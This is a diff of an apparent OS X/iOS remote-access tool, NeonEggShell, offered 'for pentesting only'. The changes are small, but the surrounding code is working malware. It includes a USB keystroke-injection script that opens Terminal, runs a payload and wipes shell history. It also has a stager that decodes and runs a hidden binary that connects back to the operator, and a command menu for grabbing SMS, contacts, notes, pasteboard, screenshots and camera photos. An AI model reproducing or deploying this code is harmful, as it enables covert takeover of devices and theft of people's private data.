@@ -25,7 +25,7 @@ def banner():
 |  |\    | |  .--' .-._)   \ 
 |  | \   | |  `---.\       / 
 `--'  `--' `------' `-----' """			
-	print WHITE + "    [Version 1.8]"
+	print WHITE + "    [Version 1.8.2]"
 	print RED + "  Created by NeonEggplant" + GREEN
 	print "\nNeonEggShell, OS X and iOS command shell"
 	print WHITE + "For pentesting only, I am not responsable\nfor any damage you may cause" + GREEN
@@ -213,9 +213,9 @@ const int pin = 1;//default onboard led pin
 void setup() {
   pinMode(1,OUTPUT); //we are going to control this pin
   DigiKeyboard.sendKeyStroke(KEY_W, MOD_GUI_LEFT);//bypass "Keyboard Setup" prompt
-  delay(ds);
+  delay(500);
   DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);//open spotlight
-  delay(ds);
+  delay(500);
   DigiKeyboard.println("Terminal");//open terminal
   delay(4000);  
   DigiKeyboard.println("""+"\""+payload+""";history -wc;killall Terminal;"); //execute payload, clear history, close terminal
@@ -307,7 +307,7 @@ def injectpayload(host,port,conn,s):
 
 	else:
 		settings=1
-		print INFO+"[*]  "+WHITE+"is mac"
+		print INFO+"[*]  "+WHITE+"Device is mac"
 		payloaddata = open("esplosx", "rb");
 	conn, addr = s.accept();print INFO+"[*]  "+WHITE+"Sending stage..." #when we get a connection we will send the stage
 	conn.send( "echo '" + base64.b64encode(payloaddata.read()) + "' | base64 --decode >/tmp/.espl; chmod +x /tmp/.espl; /tmp/.espl "+host+" "+port+" & rm /tmp/.espls & exit\n"); #trigger the payload to execute with a line break
@@ -466,10 +466,10 @@ def interactiveshell(name,conn,s,settings):
 					print " " + RED + "midvol"+WHITE+"    - OSX mid volume"
 					print " " + RED + "lowvol"+WHITE+"    - OSX low volume"
 					print " " + RED + "itstatus"+WHITE+"  - OSX iTunes' status "
-					print " " + RED + "itplay"+WHITE+"    - OSX iTunes play "
-					print " " + RED + "itpause"+WHITE+"   - OSX iTunes pause "
-					print " " + RED + "itnext"+WHITE+"    - OSX iTunes next track"
-					print " " + RED + "itprev"+WHITE+"    - OSX iTunes previous track"
+					print " " + RED + "play"+WHITE+"      - OSX iTunes play "
+					print " " + RED + "pause"+WHITE+"     - OSX iTunes pause "
+					print " " + RED + "next"+WHITE+"      - OSX iTunes next track"
+					print " " + RED + "prev"+WHITE+"      - OSX iTunes previous track"
 					print " " + RED + "imessage"+WHITE+"  - OSX send message with current imessage account"
 					print " " + RED + "screenshot"+WHITE+"- OSX take screenshot"
 					print " " + RED + "camshot"+WHITE+"   - OSX take picture with isight camera"
@@ -505,6 +505,7 @@ def interactiveshell(name,conn,s,settings):
 					print " " + RED + "getsms"+WHITE+"    - iOS download the sms database"
 					print " " + RED + "getaddbook"+WHITE+"- iOS download the addressbook database"
 					print " " + RED + "getnotes"+WHITE+"  - iOS download the notes database"
+					print " " + RED + "getpaste"+WHITE+"  - iOS get PasteBoard contents (only works if device is unlocked)"
 					print " " + RED + "install"+WHITE+"   - iOS install packages\n"
 				print "\n " + WHITEBU + "Local Commands\n" + ENDC
 				print " " + RED + "clear"+WHITE+"     - clears the console"
